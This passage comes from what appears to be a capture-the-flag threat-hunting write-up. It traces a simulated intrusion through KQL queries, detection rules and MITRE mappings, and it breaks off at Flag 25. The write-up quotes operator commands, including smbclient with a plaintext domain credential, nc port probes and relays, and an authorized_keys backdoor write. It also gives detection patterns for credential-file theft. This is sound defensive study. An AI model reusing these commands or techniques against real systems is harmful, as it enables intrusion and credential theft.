This alert was the earliest possible detection point for the entire intrusion — had it been correctly triaged, the intrusion could have been identified and contained roughly 104 minutes before the operator's return as `sancadmin`.

### 🔗 Attack Chain Position
Represents the earliest detection opportunity in the entire attack chain — directly corresponds to the moment of Flag 2's initial access command.

### 🔧 KQL Query Used

No additional query needed — derived from case file review and timestamp correlation with Flags 2 and 3.

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF DNS query alert fires for a domain not on allowlist
AND domain registration age < 90 days
THEN ALERT — HIGH (do not auto-close without registration/reputation check)
```

**Hunting Tip:**
When reviewing closed false positives, always cross-reference closure timestamps against any confirmed compromise timeline — closures with thin or generic rationale ("baseline traffic", "allowlist incomplete") that fall within a confirmed intrusion window are high-priority re-validation candidates.

**MITRE Reference:** N/A — detection/triage gap analysis.

</details>

---

<details>
<summary>🚩 <strong>Flag 7: Implant Process Verification</strong> — <code>T1036, T1543.002</code> — 🔴 Critical</summary>

### 🎯 Objective
Determine whether two distinct security tickets referencing `helix-update` represent two separate executions or a single persistent process, and identify the exact PID/PPID configuration.

### 📌 Finding
`34616/1` — a single process chain. PID 34616 (launched via `nohup`) was re-parented to PID 1 (systemd/init) after the dropper subshell exited, then performed an in-memory image swap to become the running `/tmp/helix-update` implant under the same PID, with `excluded` the dropper-side parent (34609, which had already died).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **Implant PID** | `34616` |
| **Implant PPID** | `1 (systemd/init)` |
| **Launch Time** | `2026-04-30T21:54:56Z` |

### 💡 Why It Matters
Confirms the two tickets refer to a single, continuously-running implant rather than separate executions — the implant has been running uninterrupted under systemd since 21:54:56 UTC, including throughout the credential harvesting phase that followed.

### 🔗 Attack Chain Position
Directly follows the staging chain (Flag 3) — this is the implant's final, stable runtime state, which persists through the remainder of the investigation.

### 🔧 KQL Query Used

```kql
LinuxProcess_CL
| where TimeGenerated between (datetime(2026-04-30T21:00:00Z) .. datetime(2026-05-01T04:00:00Z))
| where DvcHostname == "GF-DEV01"
| where TargetProcessFilePath has "helix-update" or TargetProcessCommandLine has "helix-update"
| project TimeGenerated, TargetProcessId, ActingProcessId, TargetProcessFilePath, TargetProcessCommandLine
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxProcess_CL
AND ActingProcessId == 1
AND TargetProcessFilePath has "/tmp/"
AND TargetProcessFilePath does not match known software inventory
THEN ALERT — CRITICAL (Unknown Binary Re-Parented to systemd from /tmp)
```

**Hunting Tip:**
The challenge hint to "exclude the dropper-side parent" is key — a script parent (34609) that helped set up the implant but then died is not the implant's runtime parent. The runtime parent of an actively persistent binary launched via `nohup` will be PID 1.

**MITRE Reference:** [T1036](https://attack.mitre.org/techniques/T1036) / [T1543.002](https://attack.mitre.org/techniques/T1543/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 8: Implant Network Footprint via Cloudflare</strong> — <code>T1583.006, T1102</code> — 🟠 High</summary>

### 🎯 Objective
Pivot the implant's PID (34616) into network telemetry to find what carried its traffic — described as "the picture isn't what you'd expect."

### 📌 Finding
The implant and related processes (4 unique PIDs) made outbound connections exclusively to Cloudflare IP ranges (104.16.x.x and 104.21.x.x) — not traditional C2 beaconing, but legitimate-looking traffic to a shared CDN that hosts both the malicious download infrastructure and what appears to be unrelated npm/node activity.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **PID 34612** | `curl downloading helix-update from 104.21.57.185 (abordsecurity.space, Cloudflare-hosted)` |
| **PID 34739** | `node/npm install hitting Cloudflare CDN 104.16.x.x` |
| **PID 35250** | `node/npm ci hitting Cloudflare CDN 104.16.x.x` |
| **PID 43047** | `node hitting Cloudflare CDN 104.16.4.34` |
| **Excluded PID** | `34608 (curl) — connected to 104.21.57.185 but showed Initiated: false (a DNS response, not an initiated outbound connection)` |

### 💡 Why It Matters
By hosting delivery infrastructure on Cloudflare, the attacker made the traffic indistinguishable from legitimate web/CDN activity and impossible to block at the perimeter without causing massive collateral damage to any service relying on the same CDN.

### 🔗 Attack Chain Position
Establishes the network-level footprint of the implant's delivery and ongoing activity — directly informs the IOC summary's network indicators and the detection gap analysis.

### 🔧 KQL Query Used

```kql
LinuxNetwork_CL
| where TimeGenerated between (datetime(2026-04-30T21:54:00Z) .. datetime(2026-05-01T01:03:00Z))
| where _ResourceId contains "gf-dev01"
| where DstIpAddr startswith "104.16"
    or DstIpAddr startswith "104.21"
| project TimeGenerated, ActingProcessId, ActingProcessName, ActingProcessFilePath, ActorUsername, DstIpAddr, DstPortNumber
| order by ActingProcessId asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxNetwork_CL
AND DstIpAddr in (104.16.0.0/12, 104.21.0.0/16)
AND ActingProcessFilePath has "/tmp/"
THEN ALERT — HIGH (Process in /tmp Connecting to Cloudflare-Fronted Infrastructure)
```

**Hunting Tip:**
When looking for network activity tied to an implant, filter TO the infrastructure IP ranges the malware used, not away from them. A "picture that isn't what you'd expect" often means the malicious traffic is deliberately blended with legitimate-looking traffic to the same destination.

**MITRE Reference:** [T1583.006](https://attack.mitre.org/techniques/T1583/006)

</details>

---

<details>
<summary>🚩 <strong>Flag 10: Credential Harvesting — Implant Child Processes</strong> — <code>T1003, T1552.001, T1552.004</code> — 🔴 Critical</summary>

### 🎯 Objective
Summarize the spawned processes and watch-rule categories triggered by children of the implant (PID 34616), excluding the implant binary itself.

### 📌 Finding
Four distinct tool/watch-key pairs: `aws → aws_creds`, `bash → ssh_user_keys`, `kubectl → kube_creds`, `ssh → ssh_user_keys` — confirming systematic harvesting of AWS, Kubernetes, and SSH credential material by child processes of the implant.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **Parent PID** | `34616 (helix-update)` |
| **aws → aws_creds** | `AWS credential file access` |
| **kubectl → kube_creds** | `Kubernetes credential file access` |
| **ssh / bash → ssh_user_keys** | `SSH key file access (2 tool paths)` |

### 💡 Why It Matters
This is the implant's primary operational purpose post-daemonization — systematic, automated harvesting of credential material across cloud (AWS), container orchestration (Kubernetes), and SSH access — all conducted while the operator was not yet interactively present.

### 🔗 Attack Chain Position
The implant's core activity during its 104-minute dwell time before the operator's return — directly enables the SSH backdoor (Flag 13) and the credentials later used for lateral movement.

### 🔧 KQL Query Used

```kql
LinuxSyscall_CL
| where Ppid == 34616
| where Exe !contains "helix-update"
| summarize count() by Comm, AuditKey
| order by Comm asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxSyscall_CL
AND AuditKey in ("aws_creds", "kube_creds", "ssh_user_keys")
AND Ppid is a child of a process re-parented to PID 1 from /tmp
THEN ALERT — CRITICAL (Credential File Access by Daemonized Unknown Process)
```

**Hunting Tip:**
`LinuxSyscall_CL` (auditd watch rules) captures kernel-level file access that process creation logs don't show. Filter to children of a known implant PID and summarize by process name and watch key category to reveal the implant's operational playbook.

**MITRE Reference:** [T1003](https://attack.mitre.org/techniques/T1003) / [T1552.001](https://attack.mitre.org/techniques/T1552/001) / [T1552.004](https://attack.mitre.org/techniques/T1552/004)

</details>

---

<details>
<summary>🚩 <strong>Flag 11: Credential Harvesting — Implant Self-Reads</strong> — <code>T1552.001</code> — 🟠 High</summary>

### 🎯 Objective
Identify which watch-rule category, triggered by the implant binary itself (not its children), surfaces the mechanism behind BOTH the `sancadmin` and `t.harris` credential compromises.

### 📌 Finding
`ssh_user_keys` (5 hits when filtered to the implant itself) — SSH key file reads are the single mechanism that unlocked both compromised accounts: `sancadmin` (SSH'd in from `194.36.110.139` using a harvested key) and `t.harris` (credentials used for lateral movement). Note: when ranked purely by count, `claude_data` was the top result (6 hits), but it explains only one credential source, not both.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **Implant PID** | `34616 (helix-update, self-triggered events)` |
| **Top by count** | `claude_data (6 hits) — explains one credential source` |
| **Answer (explains both)** | `ssh_user_keys (5 hits) — SSH keys are the access mechanism for both sancadmin and t.harris` |

### 💡 Why It Matters
This distinguishes between "what was accessed most" and "what access mechanism actually enabled the operator's subsequent actions" — the implant's SSH key harvesting is the single root cause behind both subsequent account compromises.

### 🔗 Attack Chain Position
Directly explains how the implant's credential harvesting (Flag 10) translated into the operator's ability to return as `sancadmin` (Flag 18) and later use `t.harris`'s credentials for lateral movement (Flag 22).

### 🔧 KQL Query Used

```kql
LinuxSyscall_CL
| where Exe contains "helix-update"
| summarize count() by AuditKey
| order by count_ desc
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
When a question asks "which single artifact explains multiple downstream compromises," don't default to the highest-count result — trace which access mechanism (e.g. SSH keys) is actually shared across the affected accounts. `claude_data` and `ssh_user_keys` are two separate findings from the same query with different interpretations.

**MITRE Reference:** [T1552.001](https://attack.mitre.org/techniques/T1552/001)

</details>

---

<details>
<summary>🚩 <strong>Flag 13: Backdoor SSH Key Write</strong> — <code>T1098.004</code> — 🔴 Critical</summary>

### 🎯 Objective
Recover the SSH public key appended to `authorized_keys` by the implant's child process, referenced by TKT-002.

### 📌 Finding
A Sysmon EventID 1 (process creation) record in `Syslog`, timestamped 22:57:52 UTC, captured the full command line writing the SSH public key to `/home/a.kumar/.ssh/authorized_keys`. The key's comment field reads `octotempest@operator`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **Timestamp** | `2026-04-30T22:57:52Z` |
| **Target File** | `/home/a.kumar/.ssh/authorized_keys` |
| **Initiating Process** | `bash, PID 46129, child of helix-update (34616)` |
| **Key Comment** | `octotempest@operator` |

### 💡 Why It Matters
This is a permanent, reboot-surviving backdoor written directly to `a.kumar`'s account — and the key comment is the strongest single attribution artifact recovered in this entire investigation.

### 🔗 Attack Chain Position
Direct output of the implant's SSH key harvesting (Flag 10/11) — establishes the persistent backdoor that remains active at the conclusion of this hunt (Flag 41).

### 🔧 KQL Query Used

```kql
Syslog
| where TimeGenerated between (datetime(2026-04-30T22:54:00Z) .. datetime(2026-04-30T23:00:00Z))
| where Computer == "GF-DEV01"
| where SyslogMessage contains "authorized_keys"
| project TimeGenerated, SyslogMessage
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF Syslog (Sysmon for Linux, EventID 1)
AND CommandLine contains "authorized_keys"
AND InitiatingProcess is not a known configuration management tool
THEN ALERT — CRITICAL (Programmatic Modification of authorized_keys)
```

**Hunting Tip:**
SSH key writes performed programmatically by an implant (rather than typed interactively) will not appear in `LinuxShellHistory_CL`. Pivot to `Syslog` and filter for the target filename directly — Sysmon EventID 1 process creation events capture the full command line including any embedded key material and comments.

**MITRE Reference:** [T1098.004](https://attack.mitre.org/techniques/T1098/004)

</details>

---

<details>
<summary>🚩 <strong>Flag 14: C2 Infrastructure Enrichment</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Enrich the attacker's source IP (`194.36.110.139`) with infrastructure ownership data.

### 📌 Finding
`194.36.110.139` resolves to AS9009, M247 Ltd — a hosting provider commonly associated with bulletproof/VPS infrastructure used by threat actors for C2.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **IP** | `194.36.110.139` |
| **ASN** | `AS9009` |
| **Owner** | `M247 Ltd` |
| **Source** | `https://bgp.he.net/ip/194.36.110.139` |

### 💡 Why It Matters
Confirms the operator's source IP belongs to commodity hosting infrastructure rather than a residential or corporate network — consistent with deliberate C2/operator infrastructure rather than a misconfigured legitimate connection.

### 🔗 Attack Chain Position
Enriches the C2 source IP first observed in the `sancadmin` SSH session (Flag 18) and the late-session listener probe (Flag 30).

### 🔧 KQL Query Used

No KQL query — external enrichment via BGP/WHOIS lookup at `https://bgp.he.net/ip/194.36.110.139`.

### 🛡️ Detection Recommendation

**Hunting Tip:**
BGP/WHOIS enrichment of any operator-controlled IP is a quick, low-cost step that often surfaces hosting providers with poor abuse response — useful both for blocking decisions and for building an infrastructure profile of the threat actor.

**MITRE Reference:** N/A — threat intelligence enrichment step.

</details>

---

<details>
<summary>🚩 <strong>Flag 15: Operator Attribution Artifact</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify the single artifact that carries the operator's chosen handle directly in the data.

### 📌 Finding
The SSH key comment (`octotempest@operator`) from Flag 13 — the operator's self-chosen handle, embedded directly in the persistent backdoor artifact, is the strongest attribution signal because threat intelligence can pivot directly on this handle to chain to known actor infrastructure and tradecraft.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Artifact** | `SSH key comment` |
| **Value** | `octotempest@operator` |
| **Source Flag** | `Flag 13 (authorized_keys backdoor write)` |

### 💡 Why It Matters
Distinguishes between telemetry categories (like `claude_data`, a watch-key name) and actual physical/data artifacts that carry attribution value — the SSH key comment is data the operator chose to embed, not metadata generated by the system.

### 🔗 Attack Chain Position
Directly feeds the threat actor group attribution in Flag 16.

### 🔧 KQL Query Used

No additional query needed — synthesized from Flag 13's findings.

### 🛡️ Detection Recommendation

**Hunting Tip:**
When asked to identify "the strongest attribution artifact," distinguish between system-generated telemetry labels and operator-chosen data embedded in persistent artifacts (key comments, filenames, user-agent strings, etc.) — the latter carries far more attribution value.

**MITRE Reference:** N/A — attribution synthesis step.

</details>

---

<details>
<summary>🚩 <strong>Flag 16: Threat Actor Group Attribution</strong> — <code>N/A</code> — 🟡 Medium</summary>

### 🎯 Objective
Cross-reference the operator's profile (handle, TTPs, infrastructure) against known threat actor groups.

### 📌 Finding
**Scattered Spider** (tracked as UNC3944 by Mandiant, and as Octo Tempest by Microsoft — directly matching the `octotempest@operator` handle from Flag 15).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Attributed Group** | `Scattered Spider / UNC3944 / Octo Tempest` |
| **Reference** | `https://attack.mitre.org/groups/G1015/` |
| **Matching Indicators** | `SSH key backdoors, credential harvesting, Cloudflare infrastructure fronting, operator handle directly matching "Octo Tempest"` |

### 💡 Why It Matters
Attribution to a known, tracked group provides immediate access to that group's documented TTPs, prior victimology, and known infrastructure patterns — directly informing both the remediation priorities and what additional activity to hunt for.

### 🔗 Attack Chain Position
Synthesizes all attribution evidence gathered across Flags 13–15 into a final actor attribution for the report.

### 🔧 KQL Query Used

No KQL query — MITRE ATT&CK group reference lookup.

### 🛡️ Detection Recommendation

**Hunting Tip:**
The operator's self-chosen handle directly matching a publicly tracked group's Microsoft-assigned codename (Octo Tempest) is an unusually direct attribution signal — but should still be corroborated against TTPs (here: SSH key backdoors, Cloudflare fronting, multi-protocol lateral movement) rather than relied on alone.

**MITRE Reference:** [G1015 — Scattered Spider](https://attack.mitre.org/groups/G1015/)

</details>

---

<details>
<summary>🚩 <strong>Flag 17: Credential Validation Before Lateral Movement</strong> — <code>T1110, T1078</code> — 🟠 High</summary>

### 🎯 Objective
Characterize the pattern of mixed authentication failures and successes on `t.harris`'s account on `GF-WS01` before the alerted RDP logon.

### 📌 Finding
A mixed failure/success pattern with a known (already-harvested) credential is not brute force — it represents the operator testing credentials they already possessed (from Flag 11's SSH key harvesting) to confirm validity before committing to lateral movement.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-WS01` |
| **Account** | `t.harris` |
| **Pattern** | `Mixed failures and successes on a single account, immediately preceding an alerted RDP logon` |
| **Interpretation** | `Credential validation, not brute force — credential already harvested via Flag 10/11` |

### 💡 Why It Matters
Correctly distinguishing credential validation from brute force changes the detection priority — brute force generates many distinct credential guesses, while validation of a single already-stolen credential is a much quieter, more targeted signal that traditional brute-force detections will miss.

### 🔗 Attack Chain Position
Bridges the implant's credential harvesting (Flag 10/11) to the operator's confirmed landing on `GF-WS01` (Flag 18) — this is the operator confirming the harvested credential works before using it.

### 🔧 KQL Query Used

No additional query needed — pattern observed in GF-WS01 authentication logs as referenced in case file tickets.

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF authentication logs show mixed LogonFailed/LogonSuccess
AND for the SAME AccountName within a short window
AND immediately preceding a new RemoteInteractive session
AND the account's credential source correlates with a recent credential-harvesting event elsewhere in the environment
THEN ALERT — HIGH (Credential Validation Pattern Following Harvesting Event)
```

**Hunting Tip:**
Brute force produces many distinct credential guesses against one or more accounts. Credential validation produces a small number of mixed-outcome attempts against ONE account using what is very likely the correct (harvested) credential — the volume and target consistency are the differentiators.

**MITRE Reference:** [T1110](https://attack.mitre.org/techniques/T1110) (ruled out) / [T1078](https://attack.mitre.org/techniques/T1078) (confirmed)

</details>

---

<details>
<summary>🚩 <strong>Flag 18: Operator Landing Time Correlation</strong> — <code>T1021.004</code> — 🟠 High</summary>

### 🎯 Objective
Determine when `t.harris` landed on `GF-WS01`, using the closed false-positive alerts as corroborating evidence.

### 📌 Finding
`4` — four distinct closed false-positive alerts (CLOSED-1 through CLOSED-4), all timestamped at 23:47 UTC, represent first-logon noise from `t.harris`'s session on `GF-WS01`. T1 correctly dismissed each individually as behavioral noise, but the cluster timing pinpoints exactly when the operator landed.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-WS01` |
| **Account** | `t.harris` |
| **Landing Time** | `2026-04-30T23:47:00Z` |
| **Corroborating Alerts** | `CLOSED-1, CLOSED-2, CLOSED-3, CLOSED-4 (all at 23:47)` |

### 💡 Why It Matters
Demonstrates that individually-dismissed alerts can collectively pinpoint a significant event when their timing is correlated — a clustering of "noise" events at a single timestamp is itself a signal.

### 🔗 Attack Chain Position
Establishes the timestamp of the operator's successful lateral movement onto `GF-WS01`, immediately following the credential validation in Flag 17.

### 🔧 KQL Query Used

No querying needed — answer derived directly from the case file's closed false-positive table.

### 🛡️ Detection Recommendation

**Hunting Tip:**
When multiple low-severity alerts cluster at the exact same timestamp on the same host/account, treat the cluster as a single higher-confidence signal even if each individual alert was correctly dismissed as noise on its own merits.

**MITRE Reference:** [T1021.004](https://attack.mitre.org/techniques/T1021/004)

</details>

---

<details>
<summary>🚩 <strong>Flag 19: SSH Port Forward via Jump Host</strong> — <code>T1090, T1021.004</code> — 🔴 Critical</summary>

### 🎯 Objective
Connect TKT-004 and TKT-005 to explain how `t.harris`'s RDP session to `GF-WS01` appeared to originate from `10.1.0.119`, a host that cannot reach `GF-WS01` directly.

### 📌 Finding
`ssh port forward via gf-dev01` — `GF-DEV01` sits between the two subnets and has reachability to both. `sshd` and `nc.openbsd` on `GF-DEV01` forwarded RDP traffic from an SSH tunnel to `10.1.0.133:3389` (GF-WS01), making the connection appear to originate from `10.1.0.119` (a Kali machine without direct reachability to WS01).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Jump Host** | `GF-DEV01` |
| **Apparent Source (TKT-005)** | `10.1.0.119 (Kali machine, no direct path to GF-WS01)` |
| **Tunnel Mechanism (TKT-004)** | `sshd + nc.openbsd on GF-DEV01, outbound to 10.1.0.133:3389 (GF-WS01)` |

### 💡 Why It Matters
This is the mechanism by which the operator used `GF-DEV01` — the original compromised host — as a pivot point to reach the internal Windows subnet, masking the true origin of the lateral movement.

### 🔗 Attack Chain Position
Directly explains how the credential validated in Flag 17 was actually delivered to `GF-WS01` at the timestamp established in Flag 18 — `GF-DEV01` is the pivot for all subsequent lateral movement.

### 🔧 KQL Query Used

No additional query needed — answer derived by connecting TKT-004 and TKT-005 from the case file. The format `ssh + (forward/tunnel/port forward) + via gf-dev01` was provided in the question itself.

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxNetwork_CL or LinuxProcess_CL
AND ActingProcessName in ("sshd", "nc", "nc.openbsd")
AND DstPortNumber == 3389
AND DvcHostname is a Linux host (unexpected RDP-port traffic)
THEN ALERT — CRITICAL (Linux Host Forwarding RDP Traffic)
```

**Hunting Tip:**
When a connection appears to originate from a host with no plausible network path to the target, look for an intermediate host with reachability to both subnets — port-forwarding via SSH (`-L`/`-R`/`-D` or `nc` relays) is a common technique for masking the true source of lateral movement.

**MITRE Reference:** [T1090](https://attack.mitre.org/techniques/T1090) / [T1021.004](https://attack.mitre.org/techniques/T1021/004)

</details>

---

<details>
<summary>🚩 <strong>Flag 20: SAMR Enumeration Against Domain Controller</strong> — <code>T1087.002</code> — 🟠 High</summary>

### 🎯 Objective
Identify the technique name for `t.harris`'s access pattern against `\\*\IPC$\samr` on `GF-DC01` (TKT-006: 7 EID 5145 events in 32 seconds).

### 📌 Finding
**SAMR enumeration** — the standard industry term for querying the Security Account Manager Remote protocol over `IPC$`, used to enumerate domain user and group information.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host (target)** | `GF-DC01` |
| **Source** | `10.1.0.133 (GF-WS01), via t.harris` |
| **Event Pattern** | `7x EID 5145 (\\*\IPC$\samr access) in 32 seconds` |
| **Technique** | `SAMR enumeration` |

### 💡 Why It Matters
SAMR enumeration is a common reconnaissance step against domain controllers, used to enumerate domain users, groups, and policies — often a precursor to further privilege escalation or targeted account compromise once the operator has a foothold inside the domain.

### 🔗 Attack Chain Position
Represents the deepest point of penetration observed in this hunt — from `GF-DEV01` (initial access) → `GF-WS01` (lateral movement) → `GF-DC01` (domain reconnaissance).

### 🔧 KQL Query Used

No KQL query needed for this specific flag — answer derived from TKT-006 and direct terminology lookup ("SAMR IPC$ technique name").

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF Windows Security Event Log
AND EventID == 5145
AND ShareName == "IPC$"
AND RelativeTargetName contains "samr"
AND count() by SourceAddress >= 5 within 60 seconds
THEN ALERT — HIGH (SAMR Enumeration Burst)
```

**Hunting Tip:**
A burst of rapid `\\*\IPC$\samr` accesses (EID 5145) in a short window is a high-fidelity SAMR enumeration signature — most legitimate domain operations don't generate this access pattern at this frequency from a single source.

**MITRE Reference:** [T1087.002](https://attack.mitre.org/techniques/T1087/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 21: Harvested Credential Recovery</strong> — <code>T1552.001</code> — 🔴 Critical</summary>

### 🎯 Objective
Recover the plaintext credential the operator used in `smbclient` invocations from `sancadmin`'s shell history.

### 📌 Finding
`greenfield.local/t.harris%Summer2025!` — passed in plaintext via the `-U` flag in `smbclient //10.1.0.133/C$ -U "greenfield.local/t.harris%Summer2025!"`.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `sancadmin` |
| **Credential** | `greenfield.local/t.harris%Summer2025!` |
| **Command** | `smbclient //10.1.0.133/C$ -U "greenfield.local/t.harris%Summer2025!"` |

### 💡 Why It Matters
Confirms the exact `t.harris` credential — domain, username, and password — used by the operator for lateral movement attempts, and demonstrates the operator's OPSEC failure of passing credentials in plaintext on the command line, fully captured in shell history.

### 🔗 Attack Chain Position
Provides the specific credential value that Flag 17's validation pattern confirmed was valid — this is the credential used throughout the lateral movement attempts in Flags 22/23/25.

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-05-01T00:00:00Z) .. datetime(2026-05-01T04:00:00Z))
| where Computer == "GF-DEV01"
| where ShellUser == "sancadmin"
| where Command contains "smbclient"
| project TimeGenerated, ShellUser, Command
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxShellHistory_CL
AND Command contains "smbclient"
AND Command matches regex "-U\s+[\"']?[^\"']+%[^\"']+[\"']?"
THEN ALERT — CRITICAL (Plaintext Domain Credential in Shell Command)
```

**Hunting Tip:**
`smbclient -U "domain/user%password"` syntax embeds full credentials in plaintext directly in the command line — these are fully captured in shell history and represent both an attacker OPSEC failure and a defender detection opportunity.

**MITRE Reference:** [T1552.001](https://attack.mitre.org/techniques/T1552/001)

</details>

---

<details>
<summary>🚩 <strong>Flag 22: Credential Probing Across SMB Shares</strong> — <code>T1021.002</code> — 🟠 High</summary>

### 🎯 Objective
Characterize the progression of five `smbclient` attempts using the same harvested credential.

### 📌 Finding
`write access` — five attempts with the same valid credential, each varying the share (`C$` → `Users`), path, privilege level (plain vs `sudo`), or action (`put` vs `-L` listing). The operator already knew the credential worked; they were methodically probing different shares and paths to find a location where they could successfully write a file.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `sancadmin` |
| **Attempt 1** | `//10.1.0.133/C$ + put + quit` |
| **Attempt 2** | `//10.1.0.133/C$ + put (no quit)` |
| **Attempt 3** | `sudo smbclient //10.1.0.133/C$ + put (elevated)` |
| **Attempt 4** | `//10.1.0.133/Users + put to t.harris desktop` |
| **Attempt 5** | `-L (list all shares)` |

### 💡 Why It Matters
This progression confirms the operator's objective was not credential validation (already confirmed valid) but finding a writable location to drop a payload — every variation targets a different combination of share/path/privilege specifically to find where `put` would succeed.

### 🔗 Attack Chain Position
Follows the credential recovery (Flag 21) — represents the operator's active attempt to deliver a payload via SMB, which (per Flag 25) ultimately failed.

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-05-01T00:00:00Z) .. datetime(2026-05-01T04:00:00Z))
| where Computer == "GF-DEV01"
| where ShellUser == "sancadmin"
| where Command contains "smbclient"
| project TimeGenerated, Command
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Alert Rule:**
```
IF LinuxShellHistory_CL
AND Command contains "smbclient"
AND count(distinct Command) by ShellUser >= 3 within 10 minutes
THEN ALERT — HIGH (Repeated SMB Share Probing with Single Credential)
```

**Hunting Tip:**
When the same credential is used across multiple `smbclient` invocations with varying shares/paths/privileges, the operator has already validated the credential — the goal is now write-access discovery, not authentication testing.

**MITRE Reference:** [T1021.002](https://attack.mitre.org/techniques/T1021/002)

</details>

---

<details>
<summary>🚩 <strong>Flag 23: Lateral Movement Technique Sequence</strong> — <code>T1021.002, T1021.006, T1047, T1090</code> — 🔴 Critical</summary>

### 🎯 Objective
Name the techniques (tool/protocol names, not MITRE tactic categories) `sancadmin` tried, in the order attempted.

### 📌 Finding
`ligolo, smb, winrm, wmi` — `chmod +x helix-sync` and `systemctl` commands set up Ligolo (the C2 tunnel tool) first, followed by SMB file transfer attempts (`smbclient`), WinRM remote execution attempts (`nc -zv 5985` + `pwsh Invoke-Command`), and WMI remote execution attempts (`python3 wmi_exec.py`).

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **Host** | `GF-DEV01` |
| **User** | `sancadmin` |
| **Order 1** | `ligolo — chmod +x helix-sync + systemctl (C2 tunnel setup)` |
| **Order 2** | `smb — smbclient //10.1.0.133/C$ (file transfer attempt)` |
| **Order 3** | `winrm — nc -zv 5985 + pwsh Invoke-Command (remote execution attempt)` |
| **Order 4** | `wmi — python3 wmi_exec.py (remote execution attempt)` |
| **Excluded (port probe, not lateral movement)** | `nc -zv 3389 — earlier port probe, not a technique attempt` |

### 💡 Why It Matters
Order matters for real operators — this sequence shows the operator first established their own persistent infrastructure (Ligolo tunnel) before attempting any lateral movement, and then tried three distinct protocols/tools in succession when each prior attempt failed.

### 🔗 Attack Chain Position
Provides the complete ordered sequence of lateral movement techniques attempted from `GF-DEV01` toward `GF-WS01` — Flag 25 confirms all of these ultimately failed.

### 🔧 KQL Query Used

```kql
LinuxShellHistory_CL
| where TimeGenerated between (datetime(2026-04-30T23:39:00Z) .. datetime(2026-05-01T04:00:00Z))
| where Computer == "GF-DEV01"
| where ShellUser == "sancadmin"
| project TimeGenerated, Command
| order by TimeGenerated asc
```

### 🛡️ Detection Recommendation

**Hunting Tip:**
When a question asks for "technique categories" in a hands-on hunt context, look at the actual tool or protocol used in each command (smb, winrm, wmi, ssh, etc.), not the MITRE kill-chain stage (delivery, execution, etc.). Port probes (`nc -zv <port>`) alone are reconnaissance, not lateral movement attempts — only count commands that actually attempt to use the protocol.

**MITRE Reference:** [T1021.002](https://attack.mitre.org/techniques/T1021/002) / [T1021.006](https://attack.mitre.org/techniques/T1021/006) / [T1047](https://attack.mitre.org/techniques/T1047) / [T1090](https://attack.mitre.org/techniques/T1090)

</details>

---

<details>
<summary>🚩 <strong>Flag 24: Malware Signature Detection Layer</strong> — <code>T1036</code> — 🟡 Medium</summary>

### 🎯 Objective
Identify which detection layer fingerprinted `helix-sync` with a known malware signature.

### 📌 Finding
**Microsoft Defender for Cloud** (TKT-008) — fired with detection name `HackTool:Linux/Ligolo.A!MTB`, a known malware signature. TKT-007 (Microsoft Defender for Endpoint) fired only behavioral alerts with no malware signature.

### 🔍 Evidence

| Field | Value |
|-------|-------|
| **TKT-007 (MDE)** | `Behavioral alerts only — no malware signature` |
| **TKT-008 (Defender for Cloud)** | `Detection name: HackTool:Linux/Ligolo.A!MTB` |
| **Answer** | `Defender for Cloud` |

### 💡 Why It Matters
Confirms `helix-sync` is the Ligolo tunneling tool (a known, signature-detectable hacktool), distinct from `helix-update` (the Sliver implant, which evaded signature-based detection). This distinguishes the two binaries' detection profiles for remediation and detection-engineering purposes.

### 🔗 Attack Chain Position
Confirms the identity of `helix-sync` as the Ligolo component referenced in Flag 23's lateral movement sequence and established as persistence in Flag 40.

### 🔧 KQL Query Used

No querying needed — answer derived directly from case file tickets TKT-007 and TKT-008.

### 🛡️ Detection Recommendation

**Hunting Tip:**
The detection method (e.g. agentless scanning) is often a distractor — when a question asks "which layer/source" fingerprinted something, look at the `Source` or `ProviderName` field on the alert with the actual signature match, not the scanning methodology described elsewhere.

**MITRE Reference:** [T1036](https://attack.mitre.org/techniques/T1036)

</details>

---

<details>
<summary>🚩 <strong>Flag 25: Lateral Movement Outcome Analysis</strong> — <code>T1021.002, T1021.006, T1047</code> — 🟠 High</summary>

### 🎯 Objective
Determine the overall outcome of `sancadmin`'s lateral movement attempts toward `10.1.0.133` (GF-WS01) by reading return codes chronologically.

### 📌 Finding
